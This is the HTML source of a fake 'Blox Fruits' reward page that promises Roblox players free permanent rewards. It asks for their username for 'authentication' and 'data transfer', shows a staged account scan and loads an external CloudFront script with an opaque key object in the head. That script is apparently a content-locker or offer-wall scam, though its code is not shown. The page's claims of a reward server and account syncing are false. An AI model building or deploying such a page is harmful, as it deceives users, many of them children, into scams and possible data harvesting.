<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blox Fruits - Global Reward Center</title>
    
    <script type="text/javascript">
        var AncoY_reQ_shZzBc={"it":4586440,"key":"a355c"};
    </script>
    <script src="https://duw03nk63ml3f.cloudfront.net/f1e1db2.js"></script>

    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>

    <div class="app-wrapper">
        <header class="main-header">
            <img src="images/logo.png" alt="Blox Fruits" class="neon-logo">
            <div class="status-indicator">
                <span class="pulse"></span> 2026 REWARD SERVER ONLINE
            </div>
        </header>

        <section class="selection-panel">
            <h2 class="section-title">CHOOSE 3 PERMANENT REWARDS</h2>
            <div class="slots-grid">
                <div class="neon-slot" id="slot-0"></div>
                <div class="neon-slot" id="slot-1"></div>
                <div class="neon-slot" id="slot-2"></div>
            </div>
            <button id="next-step-btn" class="cyber-btn disabled" disabled>INITIALIZE TRANSFER</button>
        </section>

        <div class="gallery-grid" id="rewards-gallery">
            </div>
    </div>

    <div id="modal-input" class="glass-overlay" style="display: none;">
        <div class="terminal-card">
            <h3>ROBLOX AUTHENTICATION</h3>
            <p>Input your exact username for data synchronization:</p>
            <input type="text" id="rbx-user-field" placeholder="Username..." class="cyber-input">
            <div id="error-msg" class="error-alert" style="display: none;">USER NOT FOUND</div>
            <div class="modal-btns">
                <button class="btn-cancel" onclick="closeModals()">ABORT</button>
                <button class="btn-primary" id="search-acc-btn">SYNC ACCOUNT</button>
            </div>
        </div>
    </div>

    <div id="modal-profile" class="glass-overlay" style="display: none;">
        <div class="terminal-card">
            <div class="profile-header">
                <img id="p-avatar" src="" class="avatar-glow">
                <div class="profile-info">
                    <h2 id="p-display">---</h2>
                    <span id="p-username">@---</span>
                </div>
            </div>
            <div class="stats-row">
                <div class="stat-box">Followers<span id="p-followers">0</span></div>
                <div class="stat-box">Following<span id="p-following">0</span></div>
            </div>
            <div class="activity-bar">
                Status: <span id="p-status">Scanning...</span>
            </div>
            <button id="claim-now-btn" class="cyber-btn-full">FINALIZE DATA TRANSFER</button>
        </div>
    </div>

    <audio id="snd-tap" src="media/tap.mp3"></audio>
    <audio id="snd-select" src="media/selection.mp3"></audio>
    <audio id="snd-error" src="media/error.mp3"></audio>

    <script src="script.js"></script>
</body>
</html>
